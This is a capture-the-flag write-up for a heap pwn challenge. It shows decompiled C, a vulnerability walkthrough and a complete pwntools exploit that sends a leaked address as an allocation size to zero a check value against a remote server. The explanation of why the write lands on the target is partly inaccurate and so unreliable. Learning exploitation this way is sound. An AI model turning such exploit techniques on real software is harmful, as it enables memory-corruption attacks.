
## Challenge Overview

This pwn challenge presents us with a binary where a "bard" allocates memory, leaks a heap address, and then gives us control over where a single NULL byte is written. Our goal is to trigger the `read_flag()` function.

## Disassembly
```c

void read_flag(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


undefined8 main(void)

{
  long in_FS_OFFSET;
  size_t local_30;
  ulong local_28;
  long *local_20;
  void *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  local_30 = 0;
  local_20 = (long *)malloc(0x30000);
  *local_20 = 1;
  printstr(
          "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gif t!\n\nPlease accept this: "
          );
  printf("%p",local_20);
  sleep(1);
  for (local_28 = 0; local_28 < 0xe; local_28 = local_28 + 1) { //14
    printf("\b \b");
    usleep(60000);
  }
  puts("\n");
  printf("%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song\ 's length: "
         ,"\x1b[1;34m","\x1b[1;32m","\x1b[1;34m");
  __isoc99_scanf(&DAT_001026b1,&local_30);
  local_18 = malloc(local_30);
  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ","\x1b[1;34m","\x1b[1;32m","\x1b[1;34m")
  ;
  read(0,local_18,local_30);
  *(undefined8 *)((long)local_18 + (local_30 - 1)) = 0;
  write(1,local_18,local_30);
  if (*local_20 == 0) {
    read_flag();
  }
  else {
    printf("\n%s[%sBard%s]: Your song was not as good as expected...\n\n","\x1b[1;31m","\x1b[1;32m",
           "\x1b[1;31m");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

## Binary Analysis

Let's analyze the key parts of the code:

```c
// In main():
local_20 = (long *)malloc(0x30000);  // First large allocation
*local_20 = 1;                        // Sets value at this address to 1
printstr("In the ancient realm of Eldoria...");
printf("%p", local_20);              // Leaks the heap address to us

// Later in the code:
printf("Give me the song's length: ");
__isoc99_scanf(&DAT_001026b1, &local_30);  // We control this size
local_18 = malloc(local_30);              // Second allocation with our size

// Read our "song"
read(0, local_18, local_30);
*(undefined8 *)((long)local_18 + (local_30 - 1)) = 0;  // A NULL byte write at controlled offset

// Check condition for flag
if (*local_20 == 0) {  // If the value at local_20 is 0, display the flag
    read_flag();
}
```

## Vulnerability

The key vulnerability lies in the NULL byte write at a controlled offset. Let's break it down:

1. A large heap chunk is allocated and its address is leaked to us
2. The value `1` is written at the beginning of this chunk
3. We can control the size of a second allocation
4. After our input is read, a NULL byte (0) is written at offset `(local_30 - 1)` from the start of the second chunk
5. The flag is only displayed if the value at the first chunk is 0 (initially set to 1)

The program essentially gives us the ability to place a NULL byte anywhere in memory, relative to a heap allocation whose size we control.

## Exploitation Strategy

The exploitation is surprisingly elegant:

1. Get the leaked address of the first chunk (`local_20`)
2. Choose our allocation size (`local_30`) so that:
   - `local_18 + (local_30 - 1) == local_20`
   
When the program writes the NULL byte, it will overwrite the value `1` at `local_20` with `0`, triggering our win condition.

## Solution

Looking at the provided exploit:

```python
# Get the leaked heap address
io.recvuntil('Please accept this: ')
bunch = io.recvuntil('\x08')
hex_values = re.findall(r'0x[0-9a-f]+', bunch.decode(), flags=re.IGNORECASE)
addr = int(hex_values[0], 16)

# Request allocation size that positions the NULL byte write at the target address
io.recvuntil("song's length:")
io.sendline(str(addr+1))
```

When we request an allocation size of `addr+1`:
1. The program allocates a chunk of size `addr+1`
2. It writes a NULL byte at offset `addr` from the start of this chunk
3. Due to how the heap is organized, this NULL byte overwrites the first byte of our first allocation
4. This changes the value from `1` to `0`
5. The condition `*local_20 == 0` becomes true
6. The program calls `read_flag()`, revealing the flag


```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'blessing')
context.terminal = ['tmux', 'splitw', '-h']


host = args.HOST or '94.237.57.187'
port = int(args.PORT or 30517)



def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
    b *main+278
    c
'''.format(**locals())


io = start()

io.recvuntil('Please accept this: ')
bunch = io.recvuntil('\x08')
hex_values = re.findall(r'0x[0-9a-f]+', bunch.decode(), flags=re.IGNORECASE)
print('address is:', hex_values[0])

addr = int(hex_values[0], 16)

print(p64(addr))

io.recvuntil("song's length:")

io.sendline(str(addr+1))

io.recvuntil('song:')
io.clean(1)

# io.sendline('\x00'*0x30000)
io.clean(2)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```

## Result

![image](https://github.com/user-attachments/assets/622c0b8e-fb66-426c-8d8d-0fd7529e675b)
